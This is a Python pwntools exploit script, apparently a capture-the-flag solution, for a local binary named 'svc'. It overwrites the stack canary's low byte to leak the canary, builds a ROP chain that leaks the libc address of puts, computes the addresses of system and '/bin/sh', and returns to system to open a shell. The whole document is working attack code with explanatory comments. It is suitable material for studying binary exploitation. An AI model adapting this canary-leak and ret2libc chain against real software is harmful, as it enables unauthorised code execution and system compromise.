# Import pwntools
from pwn import *

target = process("./svc")

elf = ELF('./svc')

# 0x0000000000400ea3 : pop rdi ; ret
popRdi = p64(0x400ea3)

gotPuts = p64(0x602018)		# hex(elf.got['puts'])			
pltPuts = p64(0x4008d0)		# hex(elf.symbols['puts'])		

offsetPuts = 0x71e30		# hex(libc_elf.symbols['puts'])		
offsetSystem = 0x45880		# hex(libc_elf.symbols['system'])	
offsetBinsh = 0x194882		# hex(next(libc_elf.search(b'/bin/sh')))	

startMain = p64(0x400a96)

pid = util.proc.pidof(target)[0]
print("The pid is " + str(pid))
util.proc.wait_for_debugger(pid)

# Establish fucntions to handle I/O with the target
def feed(data):
	target.recvuntil(b">>")
	target.sendline(b'1')
	target.recvuntil(b">>")
	target.send(data)

def canary_leak():
	print(target.recvuntil(">>"))
	target.sendline('2')
	print(target.recvuntil("0"*0xa9))
	canaryLeak = target.recv(7)
	canary = u64(b"\x00" + canaryLeak)
	print("canary is: " + hex(canary))
	return canary

def leave():
	print(target.recvuntil(">>"))
	target.sendline("3")

# Start of with the canary leak. We will overflow the buffer write up to the stack canary, and overwrite the least signifcant byte of the canary
leakCanary = "0"*0xa8 # Fill up space up to the canary
leakCanary += "0" # Overwrite least significant byte of the canary

feed(leakCanary) # Execute the overwrite

canary = canary_leak() # Leak the canary, and parse it out

# Start the rop chain to give us a libc infoleak
leakLibc = b"0"*0xa8 # Fill up space up to the canaryls 
leakLibc += p64(canary) # Overwrite the stack canary with itself
leakLibc += b"1"*0x8 # 8 more bytes until the return address
leakLibc += popRdi # Pop got entry for puts in rdi register
leakLibc += gotPuts # GOT address of puts
leakLibc += pltPuts # PLT address of puts
leakLibc += startMain # Loop back around to the start of main

# Send the payload to leak libc
feed(leakLibc)

# Return to execute our code
leave()

# Scan in and parse out the infoleak

print(target.recvuntil("[*]BYE ~ TIME TO MINE MIENRALS...\x0a"))

putsLeak = target.recvline()[:-1]
putsLibc = u64(putsLeak + b"\x00"*(8-len(putsLeak)))
print("puts_addr:" + hex(putsLibc))

libcBase = putsLibc - offsetPuts
print("libc_addr:" + hex(libcBase))

systemLibc = libcBase + offsetSystem
print("system_addr:" + hex(systemLibc))

binshLibc = libcBase + offsetBinsh
print("binsh_addr:" + hex(binshLibc))

# Form the payload to return to system

payload = b"0"*0xa8
payload += p64(canary)
payload += b"1"*0x8
payload += popRdi # Pop "/bin/sh" into the rdi register, where it expects it's argument (single char pointer)
payload += p64(binshLibc) # Address to '/bin/sh'
payload += p64(systemLibc) # Libc address of system

print("try to rop...")
# Send the final payload
feed(payload)

target.sendline("3")

#feed(payload)

# Return to execute our code, return to system and get a shell
#leave()

target.interactive()
